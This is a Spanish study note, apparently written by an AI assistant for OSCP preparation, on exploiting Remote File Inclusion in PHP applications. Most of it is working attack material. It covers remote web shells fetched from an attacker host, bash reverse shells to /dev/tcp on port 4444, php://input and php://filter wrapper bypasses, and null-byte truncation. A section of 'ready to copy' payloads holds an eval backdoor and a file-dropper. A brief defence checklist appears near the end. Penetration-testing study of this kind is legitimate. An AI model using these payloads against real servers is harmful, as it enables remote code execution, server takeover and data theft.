## 📚 Índice

- [[#🧠 ¿Qué es RFI?]]
- [[#🟦 ¿Dónde se da RFI hoy en día?]]
- [[#🎯 Casos reales y modernos de RFI]]
    - [[#1. Aplicación PHP vieja con plantillas dinámicas]]
    - [[#2. IoT / Routers]]
    - [[#3. Frameworks PHP caseros]]
    - [[#4. APIs internas mal filtradas]]
- [[#🚨 Cómo detectar RFI rápido]]
    - [[#1. Parámetros sospechosos]]
    - [[#2. Prueba básica con un archivo remoto inofensivo]]
    - [[#3. Prueba con PHP remoto]]
- [[#⚙️ Configuración del servidor que hace posible RFI]]
- [[#🛠️ Métodos prácticos de explotación]]
    - [[#1. Hosting simple en tu máquina]]
    - [[#2. Generar reverse shell vía RFI]]
    - [[#3. RFI + bypass con URL truncation]]
    - [[#4. RFI con base64 sobre wrapper]]
- [[#⚠️ RFI moderna ≠ incluir .php remoto]]
- [[#🧩 Técnicas avanzadas de hoy (relevantes para OSCP)]]
    - [[#✔ RFI → LFI combinado]]
    - [[#✔ RFI → SSRF trigger]]
- [[#🧾 Cómo probar RFI paso a paso]]
    - [[#1. Ver si incluye texto remoto]]
    - [[#2. Ver si ejecuta PHP]]
    - [[#3. Reverse shell si funciona]]
- [[#🧨 Payloads listos para copiar]]
    - [[#Output de comandos]]
    - [[#Backdoor minimalista]]
    - [[#File upload vía echo]]
- [[#🧿 Cómo defender detectar (para entrevistas)]]
- [[#🧩 Checklist OSCP-style]]



---
## 🧠 ¿Qué es RFI?

Una **Remote File Inclusion (RFI)** ocurre cuando una aplicación (normalmente PHP mal configurado) permite que el usuario **controle la ruta** de un archivo a incluir, y además **incluye archivos remotos vía URL**, por ejemplo con:

```php
include($_GET["page"]);
require($_GET["template"]);
include_once($_POST["path"]);
```

Y el parámetro vulnerable acepta un **[http://URL](http://url/)** remoto.

Si el servidor permite **allow_url_fopen = On** o **allow_url_include = On**, entonces puedes:

- **Incluir un archivo remoto con código malicioso**
    
- **Ejecutar PHP remoto**
    
- **Tomar control total del servidor**
    

---

## 🟦 ¿Dónde se da RFI hoy en día?

Aunque es menos común que LFI, **todavía existe en**:

- CMS custom hechos por empresas pequeñas
    
- Paneles administrativos hechos en PHP (legacy)
    
- Aplicaciones viejas con parámetros tipo `?page=`, `?lang=`, `?view=`
    
- APIs internas que exponen parámetros de plantillas
    
- Routers y dispositivos IoT con PHP embebido
    
- Aplicaciones WordPress con plugins inseguros **(pero no necesariamente los de hace 80 años)**
    

---

# 🎯 Casos reales y modernos de RFI

## 1. **Aplicación PHP vieja con plantillas dinámicas**

```php
<?php include($_GET['page']); ?>
```

Ejemplo vulnerable:

```
http://victima.com/index.php?page=http://malicioso.com/shell.txt
```

Tu archivo remoto:

```php
<?php system($_GET['cmd']); ?>
```

Explotación:

```
http://victima.com/index.php?page=http://tu-ip/shell.txt&cmd=id
```

---

## 2. **IoT / Routers**

Muchos dispositivos antiguos usan PHP:

```
http://192.168.1.1/apply.cgi?page=http://tu-ip/backdoor.txt
```

---

## 3. **Frameworks PHP caseros**

Parámetros típicos vulnerables:

- `?controller=`
    
- `?view=`
    
- `?theme=`
    
- `?layout=`
    

Ejemplo:

```
http://victima.com/index.php?theme=http://tu-ip/theme.php
```

---

## 4. **APIs internas mal filtradas**

Incluso endpoints tipo:

```
/api/render?template=http://ataque.com/a.txt
```

Si internamente hacen:

```php
include($_GET['template']);
```

→ **Game over.**

---

# 🚨 Cómo detectar RFI rápido

### 1. Parámetros sospechosos

```
?file=
?page=
?view=
?module=
?component=
?template=
?layout=
?dir=
?path=
?include=
```

### 2. Prueba básica con un archivo remoto _inofensivo_

```
http://victima.com/index.php?page=http://tu-ip/
```

Te montas tu servidor en python y ves si recibes la peticion, ahi puedes ver que archivo espera o si puedes agregarle cualquiera:

```python
python3 -m http.server 80
```

Si aparece en la página → **vulnerable.**

### 3. Prueba con PHP remoto

```
<?php echo "RFI-" . rand(1000,9999); ?>
```

---

# ⚙️ Configuración del servidor que hace posible RFI

Para que RFI funcione, el servidor PHP debe tener:

```
allow_url_fopen = On
allow_url_include = On
```

En 2025 ES MENOS COMÚN,  
pero:

- MUCHAS empresas no actualizan su entorno
    
- IoT + routers sí lo tienen activado
    
- CTFs lo usan
    
- Wordpress viejos y plugins custom pueden activarlo
    

---

# 🛠️ Métodos prácticos de explotación

## 🔹 **1. Hosting simple en tu máquina**

Usa Python:

```bash
python3 -m http.server 80
```

Crea `evil.php`:

```php
<?php system($_GET['cmd']); ?>
```

Explotación:

```
http://victima.com/index.php?page=http://TU-IP/evil.php&cmd=whoami
```

---

## 🔹 **2. Generar reverse shell vía RFI**

evil.php:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/TU-IP/4444 0>&1'"); ?>
```

Servidor

```bash
nc -lvnp 4444
```

Explotación:

```
http://victima.com/?page=http://TU-IP/evil.php
```

---

## 🔹 **3. RFI + bypass con URL truncation**

Si solo aceptan HTTP sin extensión:

```
http://victima.com/?page=http://TU-IP/shell
```

Usa:

```
http://TU-IP/shell?
http://TU-IP/shell//
http://TU-IP/shell%00
```

---

## 🔹 **4. RFI con base64 sobre wrapper**

Si bloquean URLs directas:

```
?page=php://input
```

Envías POST:

```php
<?php system("id"); ?>
```

Este **es un caso real** y muy común.

---

# ⚠️ RFI moderna ≠ incluir .php remoto

**HOY en día la explotación se hace así**:

### RFI → Convertirla en **RCE vía wrappers**

Ejemplo real:

```
?page=http://attacker.com/a.txt
```

Si lo bloquean:

Prueba wrappers:

```
?page=php://filter/convert.base64-decode/resource=http://tu-ip/payload.txt
```

Payload en base64.

---

# 🧩 Técnicas avanzadas de hoy (relevantes para OSCP)

### ✔ RFI → LFI combinado

Muchos filtros bloquean URLs remotas, pero permiten:

```
?page=php://input
```

y tú inyectas PHP.

O:

```
?page=php://filter/convert.base64-decode/resource=/etc/passwd
```

### ✔ RFI → SSRF trigger

Algunas apps solo cargan contenido remoto en modo lectura.

Ejemplo:

```
?page=http://tu-ip:8000/
```

Entonces tu servidor recibe la petición → SSRF detectado.

---

# 🧾 Cómo probar RFI paso a paso

## 1. Ver si incluye texto remoto

```
/page=http://TU-IP/test.txt
```

## 2. Ver si ejecuta PHP

```
/page=http://TU-IP/exec.php
```

exec.php:

```php
<?php echo "EXEC:" . system("whoami"); ?>
```

## 3. Reverse shell si funciona

Payload reverse:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/TU-IP/4444 0>&1'"); ?>
```

---

# 🧨 Payloads listos para copiar

## Output de comandos

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

## Backdoor minimalista

```php
<?php eval($_REQUEST['cmd']); ?>
```

## File upload vía echo

```php
<?php file_put_contents("/tmp/x", base64_decode($_POST['b64'])); ?>
```

---

# 🧿 Cómo defender / detectar (para entrevistas)

- Sanitizar parámetros que cargan archivos
    
- Nunca usar `include($_GET[])`
    
- allow_url_include = Off
    
- allow_url_fopen = Off
    
- Whitelist de archivos locales
    
- IDS/IPS detectan includes remotos con `http://` en parámetros
    

---

# 🧩 Checklist OSCP-style

- ¿Acepta URLs remotas?
    
- ¿El parámetro está ligado a include()?
    
- ¿Hay wrappers disponibles?
    
- ¿Permite php://input?
    
- ¿Puedes convertirla en RCE?
    
- ¿Puedes combinarla con LFI?
    
- ¿Puedes forzar tu archivo remoto con bypasses?
    

---

Si quieres, te hago **otra nota parecida para LFI**, o una **plantilla de Obsidian** para vulnerabilidades web con emojis, secciones y códigos listos para copiar.